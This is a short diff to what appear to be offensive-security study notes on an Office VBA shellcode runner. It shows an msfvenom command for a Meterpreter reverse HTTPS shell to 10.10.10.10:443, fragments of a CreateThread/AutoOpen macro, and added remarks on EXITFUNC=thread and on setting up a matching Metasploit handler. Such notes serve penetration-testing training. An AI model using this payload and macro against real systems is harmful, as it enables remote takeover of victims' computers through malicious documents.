@@ -1076,6 +1076,8 @@ HANDLE CreateThread(
 msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f vbapplication
 ```
 
+EXITFUNC=thread because our shell would be killed when office is closed, metasploit's AutoMigrade module would solve this also. 
+
 ## Entire VBA Code
 ```
 Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
@@ -1113,6 +1115,7 @@ Sub AutoOpen()
     MyMacro
 End Sub
 ```
+To work as expected, this requires a matching 32-bit multi/handler in Metasploit with the EXITFUNC set to "thread" and matching IP and port number.
 
 
 
